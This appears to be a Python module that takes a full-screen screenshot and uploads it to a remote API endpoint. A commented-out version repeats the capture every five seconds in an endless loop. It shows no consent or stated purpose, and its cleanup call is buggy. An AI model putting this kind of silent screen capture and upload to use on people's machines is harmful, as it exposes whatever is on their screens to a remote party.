import threading
import pyautogui
import requests
import datetime
import base64
import json
import os

from time import sleep
from io import BytesIO

class Screenshot(threading.Thread):

    def __init__(self, api: str, key: str):
        super().__init__()
        self.name = "Screenshot"
        self.api = api
        self.key = key

    def run(self):
        img = pyautogui.screenshot()

        response = requests.post("https://" + self.api + "/screenshot", headers={"x-api-key": self.key})

        if response.ok:
            url = response.json()
            now = datetime.datetime.now()
            filename = now.strftime("screenshot_%M_%S.jpg")
            img.save(filename)
            file = open(filename , 'rb')
            print(self.api)
            print('Screenshot get the url !\n' + url)
            uplaod_img = requests.post(url, files={'media': open(filename, 'rb')})
            if uplaod_img.ok:
                 print('Screenshot uploaded !')
            else:
                print('Screenshot upload error !\n' + str(uplaod_img.status_code))
                print(uplaod_img.reason)
            os.remove(file)
        else:
            print(response.status_code)
            print(response.reason)

#    def run(self):
#        while True:
#                try:
                    # Get the time and date
                    #timestr = time.strftime("%Y%m%d-%H%M%S")
                    # Take screenshot
#                    img = pyautogui.screenshot()
                    #output_buffer = BytesIO()
                    #img.save(output_buffer, format='jpeg')
#                    print('1')


                    #byte_data = output_buffer.getvalue()
                    #base64_str = base64.b64encode(byte_data)
#                    data = json.dumps(img).encode('utf8')
#                    print(data)
                    #data = (base64_str , 'wb')
#                    print('2')

                    # Save the image
                    #pic.save(str(timestr) + '.png')

#                    response = requests.post("https://" + self.api + "/screenshot", data=data,
#                                             headers={"x-api-key": self.key})
#                    print('3')
#                    if response.ok:
#                        print('Screenshot done ! '+str(response.status_code))
#                    else:
#                        print('Screenshot error ! '+str(response.status_code))
#                        print('Screenshot error ! '+str(response.reason))
#                except Exception as e:
#                    print(e)
#                sleep(5)

